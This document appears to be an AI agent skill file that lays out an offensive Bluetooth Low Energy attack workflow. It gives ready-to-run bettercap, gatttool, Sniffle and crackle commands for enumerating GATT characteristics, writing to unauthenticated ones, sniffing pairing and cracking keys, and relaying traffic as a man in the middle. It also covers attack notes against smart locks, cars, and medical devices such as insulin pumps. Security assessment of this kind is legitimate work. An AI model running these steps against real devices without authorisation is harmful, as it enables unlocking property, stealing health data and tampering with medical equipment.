---
name: offensive-bluetooth-ble
description: Bluetooth Low Energy (BLE) attack methodology — GATT enumeration, characteristic
  read/write without auth, pairing downgrade (Just Works forced), LE Secure Connections
  bypass, MITM via active relay, sniffing with Sniffle (TI CC1352) / Ubertooth / Frontline,
  encryption key extraction (LE Legacy Pairing crackable, LE Secure Connections strong),
  proximity authentication abuse (cars, locks), and companion-app trust analysis.
  Use for IoT BLE devices, smart locks, fitness trackers, medical devices, BLE beacons,
  or any device pairing over BLE.
---

# Bluetooth Low Energy (BLE) Attacks

BLE devices communicate via GATT — a hierarchy of services, characteristics, and descriptors. Many devices treat the BLE link itself as the trust boundary, exposing privileged operations on characteristics readable/writable from any nearby device.

## Quick Workflow

1. Discover and enumerate the device's GATT tree
2. Test every characteristic for read/write/notify without authentication
3. Inspect pairing method — Just Works = no MITM protection
4. If Just Works, MITM the pairing to capture / inject
5. Reverse the companion app for proprietary command formats

---

## Discovery + GATT Enumeration

```bash
# bettercap (interactive)
sudo bettercap -eval "ble.recon on; events.show 60; ble.show"

# Or, attach to a known-MAC device
sudo bettercap -eval "ble.recon on; ble.enum AA:BB:CC:DD:EE:FF"

# bluetoothctl
bluetoothctl
> scan on
> connect AA:BB:CC:DD:EE:FF
> menu gatt
> list-attributes

# gatttool (deprecated but still works)
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary           # list services
> char-desc         # list characteristics
> char-read-uuid <uuid>
> char-write-req <handle> <hex>
```

GATT services use 16-bit UUIDs for SIG-defined services (battery, heart rate) and 128-bit UUIDs for vendor-defined ones. Custom 128-bit UUIDs are where vendor-specific commands live — that's your attack surface.

## Characteristic Auth-Free Read/Write

Test every characteristic flagged read/write/notify:

```bash
# Read all readable characteristics
for h in $(gatttool -b <MAC> --primary | awk '{print $5}'); do
  echo "=== Handle $h ==="
  gatttool -b <MAC> --char-read --handle=$h
done

# Write to writable characteristics with crafted values
gatttool -b <MAC> --char-write-req --handle=0x0010 --value=0x01
```

Common findings on consumer BLE devices:
- Door locks: `unlock` characteristic accepts any write (no auth)
- Smart bulbs: brightness/color writeable from any peer
- Wearables: PIN/lock-state readable
- BLE beacons: configurable from any peer (rebrand attacks)

## Pairing Method Identification

```bash
# Bluetoothctl shows pairing method on initial pair attempt
bluetoothctl
> pair AA:BB:CC:DD:EE:FF
# Watch for: "Confirm passkey", "Display passkey", or no prompt = Just Works
```

| Method | Security | Attack |
|---|---|---|
| Just Works | None — authenticates anything | Trivial MITM during pairing |
| Numeric Comparison | User confirms 6-digit code | UI manipulation only; crypto strong |
| Passkey Entry | 6-digit code entered or displayed | Brute attack on passkey crackable in some pairing variants |
| Out of Band (OOB) | NFC / QR exchange | Out of scope for BLE attacker |

**LE Legacy Pairing** uses TK derivation that's crackable from a captured pairing exchange. **LE Secure Connections** (Bluetooth 4.2+) uses ECDH and is strong if Just Works isn't forced.

## Sniffing the Pairing Exchange

```bash
# TI CC1352-based: Sniffle (modern, multi-channel)
sudo Sniffle -c 37,38,39 -o pairing.pcap

# Ubertooth (older but well-supported)
ubertooth-btle -f -c pairing.pcap

# Then in Wireshark, decode with crackle
crackle -i pairing.pcap -o decrypted.pcap
# Crackle handles LE Legacy Pairing TK guessing for short-passkey/JustWorks
```

For LE Legacy Pairing with Just Works, crackle recovers the LTK in seconds. For LE Secure Connections, crackle returns "encrypted with strong key, no recovery."

## Active MITM During Pairing

```bash
# btproxy / mirage-action-with-mitm — relay between device and victim's phone
mirage-action-with-mitm
# Or:
git clone https://github.com/Charmve/btproxy
sudo python btproxy.py
```

If pairing is Just Works, you become the legitimate peer for both sides — read/modify GATT operations in real time.

## Companion App Reverse Engineering

For vendor-defined characteristics, the format is in the app:

```bash
# Pull APK
adb pull /data/app/com.vendor.app/base.apk

# Decompile
jadx -d app_src base.apk

# Find BLE writes
grep -r "writeCharacteristic\|GATT_CHARACTERISTIC" app_src/

# Look at the bytes the app writes vs. observed in-air values
```

Hand off to `offensive-mobile` for deeper companion analysis.

## Specific Device Classes

### Smart Locks

- Test `unlock` characteristic for unauth write
- Test if rolling token is replayable (capture-and-replay within window)
- Check for hardcoded LTK in firmware (chip-off + binary analysis — see `offensive-iot`)

### Cars (BLE Phone-as-Key)

- Relay attacks (extending range with two SDR-equipped relays, see Tesla research 2022)
- Pairing-state machine flaws

### Medical Devices

- Often use unauthenticated GATT for telemetry — read PHI as a proximity-based attacker
- Some allow remote configuration (insulin pumps, pacemakers — coordinate disclosure carefully)

### Beacons (iBeacon, Eddystone)

- Often configurable with default password (`0000`, `12345678`, vendor-specific)
- Rebrand for tracking-confusion or counter-marketing

## Detection Considerations

- BLE has no native intrusion detection comparable to Wi-Fi WIDS
- Vendor cloud may detect anomalous characteristic patterns (rare)
- Pairing failure logs visible to user — multiple Just Works prompts may trigger suspicion

## Engagement Cheatsheet

```bash
# 1. Discover
sudo bettercap -eval "ble.recon on; events.show 60"

# 2. Connect + enum GATT
sudo bettercap -eval "ble.enum <MAC>"

# 3. Probe every characteristic for unauth read/write
for h in <handles>; do gatttool -b <MAC> --char-read --handle=$h; done

# 4. Inspect pairing — Just Works detected?
bluetoothctl pair <MAC>

# 5. If Just Works: sniff during real pair, crack LTK with crackle
sudo Sniffle -c 37,38,39 -o pair.pcap
crackle -i pair.pcap

# 6. RE companion app for proprietary commands
jadx -d app_src vendor.apk
```

---

## Key References

- Sniffle: github.com/nccgroup/Sniffle
- crackle: github.com/mikeryan/crackle
- bettercap BLE module: bettercap.org
- Bluetooth Core Spec 5.x — Volume 3 (Host) for GATT/SMP
- "Bluetooth Low Energy Hacking" (Cap Gemini, NCC research)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
